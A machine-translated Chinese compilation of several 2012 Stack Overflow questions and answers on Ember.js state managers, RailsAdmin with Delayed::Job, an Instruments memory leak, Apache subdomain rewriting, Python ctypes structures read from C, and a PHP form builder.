> 
> 赞同：1
> 
> 时间：2012-12-12T18:10:53.627
> 
> 标签：javascript, ember.js, state-machine

我开始构建一个非常基本的 Ember.StateManager 并且在获取准确的 currentState 时遇到问题。我的理解是，当一个状态的输入回调运行时，`currentState.name`应该反映这个新状态。

我正在使用 ember-1.0.0-pre.2.min.js

这是我的问题：

```
My.Tabs = {
  init: function() {
    MY.Tabs.stateManager.transitionTo('about');

    // this logs 'about' which is correct
    console.log(this.stateManager.get('currentState.name'));
  },

  stateManager: Em.StateManager.create({
    enableLogging: true,
    start: Em.State.create({
      exit: function(stateManager) {
        // this logs 'start'
        console.log(stateManager.get('currentState.name');
      }
    }),
    about: Em.State.create({
      enter: function(stateManager) {
        // ###### HERE's THE PROBLEM ######
        // this logs 'start'...at this point shouldn't this be 'about'?
        // since I'm already in the enter callback?
        console.log(stateManager.get('currentState.name');
      },
      exit: function(stateManager) {
        return console.log("On about exit");
      }
   })
  })
}; 
```

如您所见，当我调用`transitionTo('about')`并且该状态的`enter`回调运行时，`currentState.name`仍然反映原始状态，`start`.

只有在我之后`transitionTo('about')`才是`currentState.name`准确的。

是我的期望错了，还是我做错了什么？

该文档指出：

> 转换到新状态后，新的 currentState 将调用其 enter 方法，其中 StateManager 实例作为其第一个参数，一个表示转换的对象作为其第二个参数。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:19:05.557

[查看github上的源代码](https://github.com/emberjs/ember.js/blob/v1.0.0-pre.2/packages/ember-states/lib/state_manager.js#L891)我看到了

```
enterState: function(transition) {
    var log = this.enableLogging;

    var exitStates = transition.exitStates.slice(0).reverse();
    arrayForEach.call(exitStates, function(state) {
      state.trigger('exit', this);
    }, this);

    arrayForEach.call(transition.enterStates, function(state) {
      if (log) { Ember.Logger.log("STATEMANAGER: Entering " + get(state, 'path')); }
      state.trigger('enter', this);
    }, this);

    set(this, 'currentState', transition.finalState);
  } 
```

显然，在`currentState`调用 enter 方法之后设置，这将解释您所看到的。

您可以通过在转换后在控制台中获取当前状态名称来确认。

# ruby-on-rails - 如何在 RailsAdmin 中显示 Delayed::Jobs (Mongoid)

> ID：13845987
> 
> 赞同：0
> 
> 时间：2012-12-12T18:10:57.290
> 
> 标签：ruby-on-rails, mongoid, delayed-job, rails-admin

我试图让 Delayed::Job 模型显示在 rails_admin 界面中，以便我可以从浏览器查看当前排队的作业。我一直无法做到这一点——模型根本不会出现在界面中。我已经尝试过执行以下操作`config/initializers/rails_admin.rb`以及一些变体：

```
config.model Delayed::Job do
  label "Delayed Job"
  list do
    field :run_at
  end
end 
```

有人知道如何将 Delayed::Job 模型添加到 RailsAdmin 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-20T13:54:17.980

上面的答案似乎使用当前版本的 RailsAdmin 将 Delayed::Job 模型添加到空数组（意味着所有其他模型不再可见）。最适合我的`config/initializers/rails_admin.rb`是：

```
RailsAdmin.config do |config|
  config.included_models = RailsAdmin::Config.models_pool << 'Delayed::Job'

  config.model Delayed::Job do
    label 'Task'
    navigation_label 'Background Processing'
  end
end 
```

希望对某人有所帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T15:46:09.973

也许您应该尝试将该模型包含在 config/initializers/rails_admin.rb (https://github.com/sferik/rails_admin/wiki/Navigation) 中：

`ruby config.included_models << 'Delayed::Job'`

# macos - Instruments 检测到没有堆栈的奇怪泄漏（505 x 64 字节 __NSMallocBlock__）

> ID：13845989
> 
> 赞同：3
> 
> 时间：2012-12-12T18:11:03.000
> 
> 标签：macos, memory-leaks, instruments

在开发我的应用程序期间，我正在使用 Instruments 进行定期泄漏检测测试。已检测到一组新的泄漏，但没有可用的堆栈信息。它们共有 505 个 64 字节的块，包含各种信息位：

![在此处输入图像描述](../Images/10ef1f8242ca16d768fcdef945cc56ca.png)

右上角的*泄漏内容转换为：*

```
registerInterface: Frequent transitions for interface en1 (192.1 
```

这个文本没有出现在我的程序中，而且我的 MBP 在 192.168.0.0 网络上，所以它看起来像实时系统数据。其他泄露的块包含不同的信息（一些全部`0xff`包含 ASCII 片段和其他各种二进制文件）。

我认为这个泄漏不公平地归因于我的程序，特别是因为没有可用的堆栈跟踪。有没有其他人看到这个并知道修复？

*   OSX 版本：10.8.2
*   仪器版本：4.6

# apache - 从子域 URL 提供主目录而不重定向

> ID：13845992
> 
> 赞同：0
> 
> 时间：2012-12-12T18:11:09.457
> 
> 标签：apache, .htaccess, mod-rewrite, subdomain

我有一个***http.//domain.com***服务于**/var/www/domain**

我还有一个***http.//subdomain.domain.com***服务于**/var/www/domain/subdomain**

当用户访问**http.//subdomain.domain.com**我希望 apache 服务**/var/www/domain**

我一直在到处寻找，并从带有别名的虚拟主机声明中找到了解决方案

但由于我在共享主机上，所以无法编辑 httpd.conf。所以我必须从 .htaccess

这里的重要部分是不重定向用户，仅从 htaccess 提供主域目录。

# python - 在C中访问python结构数组

> ID：13845995
> 
> 赞同：1
> 
> 时间：2012-12-12T18:11:25.297
> 
> 标签：python, c, ctypes

我一直在网上搜索没有运气。我有以下 Python 代码：

```
class LED(Structure):
_fields_ = [
            ('color', c_char_p),
            ('id', c_uint32)
            ]

class LEDConfiguration(Structure):
_fields_ = [
            ('daemon_user', c_char_p),
            ('leds', POINTER(LED)),
            ('num_leds', c_uint32)
            ] 
```

这是一个使用这些结构并返回 LEDConfiguration 的简化示例函数。

```
def parseLedConfiguration(path, board):
lc = LEDConfiguration()
for config in configs:
    if( config.attributes['ID'].value.lstrip().rstrip() == board ):
        lc.daemon_user = c_char_p('some_name')
        leds = []
        #Imagine this in a loop
        ld = LED()
        ld.color = c_char_p('red')
        ld.id = int(0)
        leds.append(ld)
        #end imagined loop

        lc.num_leds = len(leds)
        lc.leds = (LED * len(leds))(*leds)

return lc 
```

现在这是我正在使用的 C 代码（我已经删除了与设置 python/调用“parseLedConfiguration”函数/等有关的所有内容，但如果有帮助，我可以添加它）。

```
 /*Calling the python function "parseLedConfiguration"
          pValue is the returned "LEDConfiguration" python Structure*/

        pValue = PyObject_CallObject(pFunc, pArgs);
        Py_DECREF(pArgs);

        if (pValue != NULL)
        {
            int i, num_leds;
            PyObject *obj = PyObject_GetAttr(pValue, PyString_FromString("daemon_user"));
            daemon_user = PyString_AsString(obj);
            Py_DECREF(obj);

            obj = PyObject_GetAttr(pValue, PyString_FromString("num_leds"));
            num_leds = PyInt_AsLong(obj);
            Py_DECREF(obj);

            obj = PyObject_GetAttr(pValue, PyString_FromString("leds"));
            PyObject_Print(obj, stdout, 0); 
```

我的问题是弄清楚如何访问返回给最终“obj”的内容。“obj”上的“PyObject_Print”显示以下输出：

```
<ConfigurationParser.LP_LED object at 0x7f678a06fcb0> 
```

我想进入一种可以访问该 LP_LED 对象的状态，就像我访问上面的“LEDConfiguration”对象一样。

**编辑 1**

我想另一个可能更重要的问题是，我的 python 代码是否正确？那是我应该如何将“结构”列表或数组存储在另一个“结构”中，以便可以从 Python C API 访问它？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:17:12.433

由于您的 EDIT 1 澄清了基本问题，让我把它放在首位：

> 猜猜另一个可能更重要的问题，我的 python 代码是否正确？那是我应该如何将“结构”列表或数组存储在另一个“结构”中，以便可以从 Python C API 访问它？

不，这就是你应该如何`Structure`在另一个数组中存储一个数组，`Structure`以便可以从`non-Python-C-API`C 代码访问它。如果您希望从 Python C API 访问它，只需使用 Python `list`.

一般来说，如果你同时用 Python 和 C 编写代码，只有一侧必须向后弯曲才能与另一侧一起工作。在 Python中使用`ctypes` `Structure`s 和`POINTER`s 之类的点是让它们可以*直接*在 C 中工作，而不必经过 C API。相反，使用类似函数的`PyList_GetItem`目的是允许您使用普通的 Python 代码，而不是`ctypes`Python 代码。

因此，如果您想在 a 中存储 a`list`以`Structure`通过 Python C API 访问，只需存储一个 Python 即可——而且您一开始`list`真的不需要`Structure`；使用普通的 Python 类（可能带有`__slots__`）。您可以编写此代码而无需导入`ctypes`。

相反，如果您想存储可以直接在 C 中使用的结构，您可以使用`ctypes`; 然后，在 C 代码中，一旦你深入`Structure`了解了，`PyObject *`你就不再需要 Python API，因为结构都是 C。当你有现有的 C 代码并且想要从 Python 与它交互，而不是在你从头开始设计 C 代码时，但是没有规则说你不能以其他方式使用它。

同时，如果这是您第一次尝试编写相互通信的 C 和 Python 代码，我建议您使用`Cython`. 然后，一旦您对此感到满意，如果您想学习`ctypes`，请做一个使用 Python 的不同项目来与`ctypes`对 Python 一无所知的 C 代码交谈。然后，第三个项目使用 C API 与一无所知的 Python 代码`ctypes`（如大多数 C 扩展模块）对话。一旦你熟悉了这三个，你就可以在未来为大多数项目选择正确的一个。

现在，回答具体问题：

首先，当`PyList_GetItem`（或 C API 中的大多数其他函数）返回 NULL 时，这意味着存在异常，因此您应该检查异常并记录它。尝试调试 C API 中的 NULL 返回值而不查看设置的异常就像尝试调试 Python 代码而不查看回溯一样。

无论如何，这个函数可能会失败有几个明显的原因：也许你正在使用越界索引调用它，或者你正在调用它根本不是 a`list`的东西。

事实上，第二个在这里似乎很明显。如果打印出来`obj`给你这个：

`<ConfigurationParser.LP_LED object at 0x7f678a06fcb0>`

然后你有一个（指向一个）`LED`对象，而`LED`对象不是`list`s。

如果您查看您的代码，您似乎在任何地方都没有`list`对象`LED`，至少在您向我们展示的代码中没有。你确实有一个`POINTER(LED)`，它可以保存一个由 s 组成的 C 数组衰减的 C 数组`LED`，但这与它们中的 Python`list`不同。它只是一个 C 数组，您可以使用 C 数组语法来取消引用：

```
PyObject *led = ledarray[i]; 
```

# php - php中的表单生成器

> ID：13845996
> 
> 赞同：0
> 
> 时间：2012-12-12T18:11:39.707
> 
> 标签：php

嗨，我是一个初学者 PHP 开发人员，我正在尝试创建一个表单生成器。生成的表单有一些问题。例如，当我单击“段落”按钮时，会生成一个包含文本字段和另一个按钮的表单。

我想当我在生成的代码中输入一些文本并按下按钮执行某些功能时，我只打印文本。

这是我的代码：

```
<form action="" method="post">
   <button type="submit" name ="Paragraph">Paragraph Text</button>
   <button type="submit" name ="MultipleChoice">Multiple Choice</button>
   <button type="submit" name ="Name">Name</button>
   <button type="submit" name ="Adress">Address</button>
   <button type="submit" name ="Number">Number</button>
   <button type="submit" name ="CheckBoxes">Checkboxes</button>
   <button type="submit" name ="DropDown">Drop Down</button>
   <button type="submit" name ="Phone">Phone</button>
   <button type="submit" name ="Email">Email</button>
</form>

<?php 
   require_once 'addform.php';
   $buttons = array('Paragraph', 'MultipleChoice', 'Name', 
              'Adress', 'Number', 'CheckBoxes', 'DropDown', 'Phone', 'Email');
   foreach ($buttons as $button){
     if(isset($_POST[$button])){
        $title;
        $input;
        if($button == 'Paragraph'){
           ?>
           <form action="" methods="post">
             Paragraph title: <input type="text" name="title"/>
             <input type="submit" value="Create" name="create"/>
           </form>
           <?php
           if(isset($_POST['title'])){
             $title = $_POST['title'];
             echo $title;
           }
        }
     }
     break;
}
?> 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:43:16.843

试试这个，它的工作原理，你已经使用`methods`而不是`method`你的段落形式......而且你使用了错误的变量名`submit`in `$_POST['']`it should be `isset($_POST['create'])`.

```
 <form action="" method="post">
   <button type="submit" name ="Paragraph">Paragraph Text</button>
   <button type="submit" name ="MultipleChoice">Multiple Choice</button>
   <button type="submit" name ="Name">Name</button>
   <button type="submit" name ="Adress">Address</button>
   <button type="submit" name ="Number">Number</button>
   <button type="submit" name ="CheckBoxes">Checkboxes</button>
   <button type="submit" name ="DropDown">Drop Down</button>
   <button type="submit" name ="Phone">Phone</button>
   <button type="submit" name ="Email">Email</button>
</form>

<?php 

   $buttons = array('Paragraph', 'MultipleChoice', 'Name', 
              'Adress', 'Number', 'CheckBoxes', 'DropDown', 'Phone', 'Email');
   foreach ($buttons as $button){
     if(isset($_POST[$button])){
        $title;
        $input;
        if($button == 'Paragraph'){
           ?>
           <form action="" method="post">
             Paragraph title: <input type="text" name="title"/>
             <input type="submit" value="Create" name="create"/>
           </form>
           <?php

        }
     }
     break;
}
     if(isset($_POST['create'])){

             $title = $_POST['title'];
             echo $title;
           }

?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:25:06.827

如果您希望标题回显，则必须在单击创建按钮时捕获..

您的创建按钮被命名为“创建”，因此将其添加到 $buttons 数组中，然后为“创建”编写一个处理程序，例如：

```
$buttons = array('create', 'Paragraph', 'MultipleChoice', 'Name', 
          'Adress', 'Number', 'CheckBoxes', 'DropDown', 'Phone', 'Email');
foreach ($buttons as $button){
 if(isset($_POST[$button])){
    $title;
    $input;
    if($button == 'Paragraph'){
       ?>
       <form action="" methods="post">
         Paragraph title: <input type="text" name="title"/>
         <input type="submit" value="Create" name="create"/>
       </form>
       <?php
    }elseif($button=='create' && isset($_POST['title'])){
       $title = $_POST['title'];
       echo $title;
    }
 }
 break; 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:14:53.617

我在这里添加了一个隐藏输入，这样你就可以输入段落条件来执行代码。

此外，您在这里还有另一个错字：*methodS="post"*但*method="post"*。现在可以了！

```
<form action="" method="post">
   <button type="submit" name ="Paragraph">Paragraph Text</button>
   <button type="submit" name ="MultipleChoice">Multiple Choice</button>
   <button type="submit" name ="Name">Name</button>
   <button type="submit" name ="Adress">Address</button>
   <button type="submit" name ="Number">Number</button>
   <button type="submit" name ="CheckBoxes">Checkboxes</button>
   <button type="submit" name ="DropDown">Drop Down</button>
   <button type="submit" name ="Phone">Phone</button>
   <button type="submit" name ="Email">Email</button>
</form>

<?php 
   require_once 'addform.php';
   $buttons = array('Paragraph', 'MultipleChoice', 'Name', 
          'Adress', 'Number', 'CheckBoxes', 'DropDown', 'Phone', 'Email');
foreach ($buttons as $button){
 if(isset($_POST[$button])){
    $title;
    $input;
    if($button == 'Paragraph'){
       ?>
       <form action="" methods="post">
         Paragraph title: <input type="text" name="title"/>
         <input type="hidden" value="set" name="Paragraph"/>
         <input type="submit" value="Create" name="create"/>
       </form>
       <?php
       if(isset($_POST['title'])){
         $title = $_POST['title'];
         echo $title;
       }
    }
 }
 break;
} 
```